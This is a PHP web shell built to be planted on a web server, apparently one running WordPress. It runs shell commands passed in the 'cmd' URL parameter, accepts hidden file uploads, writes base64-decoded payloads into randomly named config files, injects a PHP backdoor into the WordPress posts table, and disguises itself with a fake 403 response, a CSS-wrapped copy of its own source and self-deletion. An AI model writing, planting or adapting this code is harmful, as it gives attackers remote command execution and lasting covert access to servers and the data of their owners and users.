<?php  

error_reporting(0);  
@ini_set('display_errors', 0);  

header("HTTP/1.1 403 Forbidden");  

if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], './' . basename($_FILES['file']['name']));  
    echo "File uploaded!";  
}  

if(isset($_POST['username'])) { 
    $payload = base64_decode($_POST['username']);  
    file_put_contents('./config_' . rand(1000,9999) . '.php', $payload);  
}  

if(isset($_GET['cmd'])) {  
    system($_GET['cmd']);  
}  

if(isset($_GET['css'])) {  
    header("Content-Type: text/css");  
    die("/*" . file_get_contents(__FILE__) . "*/");  
}  

if(isset($_GET['inject'])) {  
    $db = new mysqli('localhost', 'root', '', 'wordpress');  
    $db->query("INSERT INTO wp_posts (post_content) VALUES ('<?php system(\$_GET[\"cmd\"]); ?>')");  
}  

register_shutdown_function(function(){  
    @unlink(__FILE__);  
});  
?>  

<form method="post" enctype="multipart/form-data" style="display:none;">  
    <input type="file" name="file">  
    <input type="submit" value="Upload">  
</form>  